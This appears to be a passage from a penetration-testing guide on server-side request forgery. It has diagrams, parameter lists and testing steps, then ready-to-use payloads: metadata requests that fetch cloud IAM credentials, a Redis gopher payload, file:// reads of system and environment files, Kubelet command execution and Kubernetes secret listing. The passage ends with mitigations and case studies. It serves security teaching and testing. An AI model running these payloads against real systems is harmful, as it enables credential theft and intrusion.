graph TB
    A[SSRF Vulnerability]
    A --> B[Cloud Metadata<br>Exploitation]
    A --> C[Internal Service<br>Access]
    A --> D[Protocol<br>Abuse]

    B --> B1["AWS: 169.254.169.254"]
    B --> B2["GCP: metadata.google.internal"]
    B --> B3["Azure: 169.254.169.254/metadata"]

    C --> C1["Admin: localhost:8080/admin"]
    C --> C2["DB: localhost:3306, 27017"]
    C --> C3["Cache: localhost:6379"]
    C --> C4["DevSrv: localhost:3000, 8000"]

    D --> D1["file:///etc/passwd"]
    D --> D2["dict://localhost:6379"]
    D --> D3["gopher://localhost:25"]
    D --> D4["ldap://localhost:389"]

    style A fill:#b7b,stroke:#333,stroke-width:2px,color:#333
    style B fill:#aae,stroke:#333,color:#333
    style C fill:#aae,stroke:#333,color:#333
    style D fill:#aae,stroke:#333,color:#333
```

### Common SSRF Parameters

```
url, dest, redirect, uri, path, continue, window, next, data, reference,
site, html, val, validate, domain, callback, return, page, feed, host,
port, to, out, view, dir, origin, source, endpoint, proxy, fetch, img_url
link, site_url, media_url
```

### Testing Process

```mermaid
graph TD
    A[Start SSRF Testing] --> B[Initial Discovery]
    B --> B1[Map Entry Points]
    B --> B2[Setup OOB Detection]
    B --> B3[Test External URLs]
    B --> B4[Analyze Responses]

    B4 --> C{Potential SSRF?}
    C -->|Yes| D[Vulnerability Confirmation]
    C -->|No| E[Test Different Parameters]
    E --> B4

    D --> D1[Test Internal Resources]
    D --> D2[Test Blind SSRF]
    D --> D3[Test Protocol Support]

    D3 --> F{Vulnerability Confirmed?}
    F -->|Yes| G[Exploitation]
    F -->|No| H[Test Bypass Techniques]
    H --> D1

    G --> G1[Port Scanning]
    G --> G2[Cloud Metadata Access]
    G --> G3[Protocol-Specific Exploitation]
    G --> G4[File Access]

    G4 --> I[Documentation/Reporting]

    style A fill:#f9f,stroke:#333,stroke-width:2px,color:#333
    style C fill:#ff9,stroke:#333,stroke-width:2px,color:#333
    style F fill:#ff9,stroke:#333,stroke-width:2px,color:#333
    style I fill:#9f9,stroke:#333,stroke-width:2px,color:#333
```

#### Initial Discovery

1. Map all application entry points accepting URLs or file paths
2. Set up out-of-band detection server (e.g., Burp Collaborator)
3. Test with benign external URL (e.g., `https://your-server.com/ssrf-test`)
4. Analyze responses and check for callbacks

#### Vulnerability Confirmation

1. Test access to common internal resources:

   ```
   http://localhost/
   http://127.0.0.1:22/
   http://127.0.0.1:3306/
   http://169.254.169.254/
   ```

2. Test for blind SSRF using time delays:

   ```
   http://slowwly.robertomurray.co.uk/delay/5000/url/http://www.google.com
   ```

3. Confirm protocol support:
   ```
   file:///etc/passwd
   gopher://localhost:25/xHELO%20localhost
   ```

#### Exploitation

1. **Port Scanning**:

   ```
   for port in {1..65535}; do
     curl -s "https://target.com/api?url=http://localhost:$port" -o /dev/null
     if [ $? -eq 0 ]; then echo "Port $port is open"; fi
   done
   ```

2. **Cloud Metadata Access**:

   ```
   # AWS
    # IMDSv2 requires first fetching a token
    curl -s -X PUT "https://target.com/api?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
    # then include it
    curl -s "https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE" -H "X-aws-ec2-metadata-token: TOKEN"
   # Then query the specific role
   curl -s "https://target.com/api?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"

   # GCP
   curl -s "https://target.com/api?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"

    # Azure
    curl -s "https://target.com/api?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
   ```

3. **Gopher Protocol Exploitation** (Redis example):

   ```
   gopher://127.0.0.1:6379/_SET%20ssrfkey%20%22Hello%20SSRF%22%0D%0ACONFIG%20SET%20dir%20%2Ftmp%2F%0D%0ACONFIG%20SET%20dbfilename%20redis.dump%0D%0ASAVE%0D%0AQUIT
   ```

4. **File Access**:
   ```
   file:///etc/passwd
   file:///proc/self/environ
   file:///var/www/html/config.php
   ```

#### Bypass Testing

1. Test IP representation variations:

   ```
   http://127.0.0.1/
   http://2130706433/
   http://0x7f.0.0.1/
   http://017700000001/
   ```

2. Test with URL encoding:

   ```
   http://127.0.0.1/ → http://127%2e0%2e0%2e1/
   ```

3. Test with open redirects:

   ```
   https://allowed-domain.com/redirect?url=http://internal-server
   ```

4. Test DNS rebinding with modern tools:

**Modern DNS Rebinding Tools:**

- **1u.ms** - Online DNS rebinding service (successor to rebinder.net)
- **Singularity of Origin** - Advanced rebinding toolkit with GUI
- **rbndr.us** - Simple rebinding for pentesting (format: `make-<ip1>-<ip2>-rbndr.us`)
- **lockyfork/rebind** - Docker container for self-hosted rebinding server
- **DNSRebindToolkit** - Python-based customizable rebinding server

Example usage:

```bash

# Using rbndr.us: first resolves to your server, then to internal IP
curl http://make-1.2.3.4-127.0.0.1-rbndr.us

# 1. Kubelet API (often unauthenticated or weakly authenticated)
curl http://127.0.0.1:10250/pods        # List all pods on node
curl http://127.0.0.1:10250/run/<namespace>/<pod>/<container> -d "cmd=id"  # Execute commands
curl http://127.0.0.1:10255/pods        # Read-only port (legacy, often still open)

# 3. Use service account to access Kubernetes API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces/default/pods

# 4. List secrets
curl -H "Authorization: Bearer $TOKEN" \
     https://kubernetes.default.svc/api/v1/namespaces/default/secrets
```

#### Service Mesh Metadata Exposure

**Istio/Envoy:**

```bash

# Envoy admin interface (often exposed on localhost)
http://127.0.0.1:15000/config_dump      # Full mesh configuration, certificates, endpoints
http://127.0.0.1:15000/clusters         # Upstream services and health
http://127.0.0.1:15000/stats            # Detailed metrics
http://127.0.0.1:15000/certs            # TLS certificates
http://127.0.0.1:15001/                 # Envoy admin on alternative port

# Pilot discovery service
http://127.0.0.1:8080/debug/endpointz   # Service endpoints
http://127.0.0.1:8080/debug/configz     # Pilot configuration
```

**Linkerd:**

```bash

# Linkerd proxy admin
http://127.0.0.1:4191/metrics           # Prometheus metrics (leaks service topology)
http://127.0.0.1:4191/ready             # Readiness endpoint
http://127.0.0.1:4140/                  # Inbound proxy admin
```

**Consul Connect:**

```bash
http://127.0.0.1:8500/v1/agent/self     # Agent configuration
http://127.0.0.1:8500/v1/catalog/services  # Service catalog
```

#### Container Runtime Socket Exposure

```bash

# Example: List containers
curl --unix-socket /var/run/docker.sock http://localhost/v1.40/containers/json

# Via SSRF (if application supports unix sockets):
http://vulnerable-app?url=unix:///var/run/docker.sock:/v1.40/containers/json

# ECS Task Metadata Endpoint (AWS ECS/Fargate)
http://169.254.170.2/v2/metadata        # Task metadata
http://169.254.170.2/v2/credentials     # IAM credentials for task role
http://169.254.170.2/v2/stats           # Task stats
http://169.254.170.2/v3/                # v3 endpoint

# GCP Cloud Run metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Kubernetes Dashboard (if exposed internally)
http://kubernetes-dashboard.kube-system.svc.cluster.local

### Input Validation

- Implement strict URL validation
- Use allowlists for domains and IP ranges
- Validate URL schemes/protocols
- Implement rate limiting
- Apply layered allow-lists: validate scheme → network range → domain, in that order

### Network Controls

- Segment internal networks
- Use egress filtering
- Implement proper firewall rules
- Disable unused URL schemes
- Block the IMDSv2 token-acquire path (`PUT /latest/api/token`) for workloads that do not need EC2 metadata
- Verify that SNI and the initial `Host` header match on every new TLS connection to mitigate HTTP/2 coalescing
- Terminate user-supplied fetches in a sandboxed egress proxy that enforces allow‑lists and IP range checks after DNS resolution
- Disallow redirects to private address space; re‑validate target after each redirect hop

### Application Design

- Use pre-signed URLs for cloud resources
- Implement proper access controls
- Use secure defaults for all URL handlers
- Implement request timeouts
- Strict, two‑stage URL validation using a trusted RFC‑3986 parser: validate scheme/host first, then resolve and validate IP/CIDR
- Prefer fetching by resource ID rather than arbitrary URL; where unavoidable, use signed callbacks (HMAC) and queue‑based fetchers

### Case Studies

- Capital One Breach (2019)
  - Exploitation of metadata service
  - Impact: 100M+ customer records exposed
- Gitlab SSRF (2019)
  - Improper URL validation in import feature
  - Could access internal services
- Microsoft Purview SSRF (2025)
  - Misconfigured proxy endpoint allowed metadata-service access, leading to cross-tenant data exposure

### Common Attack Scenarios

- Cloud metadata access leading to credential theft
- Internal service enumeration through port scanning
- Redis unauthorized access via Gopher protocol
- Jenkins exploitation through internal access